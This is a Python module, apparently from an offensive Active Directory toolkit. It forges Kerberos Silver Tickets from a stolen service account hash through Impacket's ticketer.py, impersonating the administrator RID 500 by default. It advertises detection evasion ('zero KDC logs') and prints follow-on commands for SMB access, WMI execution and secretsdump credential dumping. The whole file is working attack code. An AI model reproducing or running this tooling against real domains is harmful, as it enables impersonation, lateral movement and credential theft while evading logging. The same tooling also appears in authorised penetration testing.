"""
Silver Ticket — Forge a service ticket (TGS) with the service account hash.

Key advantage over Golden Ticket:
    - NEVER touches the Domain Controller
    - Goes directly to the target service
    - No TGT needed, no KDC logs generated

Common Silver Ticket targets:
    CIFS/<host>     — File share access (SMB)
    MSSQLSvc/<host> — SQL Server access
    HTTP/<host>     — Web service access
    HOST/<host>     — WMI, scheduled tasks, PSRemoting
    LDAP/<dc>       — DCSync (if targeting DC's machine account)
"""

import os
import subprocess
from pathlib import Path
from typing import Dict, List

from ..utils.commands import CommandReference


class SilverTicket:
    """Forge Silver Tickets (service TGS) via Impacket ticketer.py."""

    # Service-specific usage commands
    _SERVICE_USAGE: Dict[str, str] = {
        "CIFS": "smbclient.py {domain}/{user}@{host} -k -no-pass",
        "MSSQLSvc": "mssqlclient.py {domain}/{user}@{host} -k -no-pass",
        "HTTP": "# Use with web browser or curl with Kerberos auth",
        "HOST": "wmiexec.py {domain}/{user}@{host} -k -no-pass",
        "LDAP": "secretsdump.py {domain}/{user}@{host} -k -no-pass",
    }

    def __init__(self, domain: str, domain_sid: str, output_dir: Path):
        self.domain = domain
        self.domain_sid = domain_sid
        self.output_dir = output_dir

    def forge(
        self,
        username: str,
        service_hash: str,
        service_spn: str,
        target_host: str,
        service_aes256: str = "",
        user_id: int = 500,
    ) -> str:
        """
        Forge a Silver Ticket for a specific service.

        Returns the path to the .ccache file on success, empty string on failure.
        """
        print(f"\n{'=' * 60}")
        print("SILVER TICKET FORGING")
        print(f"{'=' * 60}")

        if not self.domain_sid:
            print("[-] Domain SID required")
            return ""

        service_type = service_spn.split("/")[0] if "/" in service_spn else service_spn
        short_host = target_host.split(".")[0]

        print(f"[*] Forging TGS for: {service_spn}")
        print(f"[*] As user: {self.domain}\\{username}")
        print(f"[*] Service type: {service_type}")
        print(f"[*] Target host: {target_host}")

        ccache_file = str(self.output_dir / f"silver_{service_type}_{short_host}.ccache")
        cmd = self._build_command(
            username, service_hash, service_spn, service_aes256, user_id
        )

        try:
            print(f"[*] Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )

            default_ccache = f"{username}.ccache"
            if os.path.exists(default_ccache):
                os.rename(default_ccache, ccache_file)

            if os.path.exists(ccache_file):
                self._print_success(
                    ccache_file, username, user_id, service_spn,
                    service_type, target_host,
                )
                return ccache_file

            print("[-] Silver Ticket creation failed")
            return ""

        except FileNotFoundError:
            print("[-] ticketer.py not found")
            CommandReference.print_silver_alternatives(
                self.domain, self.domain_sid, username,
                service_hash, service_spn, user_id, service_aes256,
            )
            return ""
        except Exception as e:
            print(f"[-] Silver Ticket failed: {e}")
            return ""

    def _build_command(
        self, username: str, service_hash: str, service_spn: str,
        service_aes256: str, user_id: int,
    ) -> List[str]:
        """Build the ticketer.py command for Silver Ticket forging."""
        if service_aes256:
            key_args = ["-aesKey", service_aes256]
        else:
            key_args = ["-nthash", service_hash]

        return [
            "ticketer.py",
            *key_args,
            "-domain-sid", self.domain_sid,
            "-domain", self.domain,
            "-spn", service_spn,
            "-user-id", str(user_id),
            username,
        ]

    def _print_success(
        self, ccache_file: str, username: str, user_id: int,
        service_spn: str, service_type: str, target_host: str,
    ):
        print(f"\n[+] ★ SILVER TICKET FORGED ★")
        print(f"[+] Saved to: {ccache_file}")
        print(f"[+] Service: {service_spn}")
        print(f"[+] As: {self.domain}\\{username} (RID {user_id})")
        print(f"[+] NOTE: This ticket NEVER touches the DC — zero KDC logs!")

        print(f"\n[*] Usage for {service_type} Silver Ticket:")
        print(f"    export KRB5CCNAME={ccache_file}")

        template = self._SERVICE_USAGE.get(service_type)
        if template:
            print(f"    {template.format(domain=self.domain, user=username, host=target_host)}")
        else:
            print(f"    # Use with Kerberos-aware tool targeting {service_spn}")